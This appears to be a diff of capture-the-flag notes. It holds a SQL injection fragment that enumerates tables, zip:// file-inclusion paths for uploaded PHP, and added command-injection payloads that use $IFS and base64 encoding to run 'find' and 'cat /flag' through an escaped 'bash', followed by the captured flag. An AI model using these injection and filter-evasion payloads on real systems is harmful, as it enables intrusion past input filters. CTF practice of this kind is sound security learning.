@@ -34,3 +34,8 @@ select group_concat(table_name) from information_schema.tables where table_schem
 
 /var/www/html\uploads/a4a22ef2bdb6b27beaadab272f322f63.zip%23test.php
 zip:///var/www/html/uploads/69375d4146185554bec820ad8747f298.zip%231.php
+
+echo$IFS$9ZmluZCAvIC1tYXhkZXB0aCAx|base64$IFS$9-d|\b\a\s\h
+echo$IFS$9Y2F0IC9mbGFn|base64$IFS$9-d|\b\a\s\h
+flag{edc8111483665dbbe691c39c94470b18}
+Y2F0IC9mbGFn
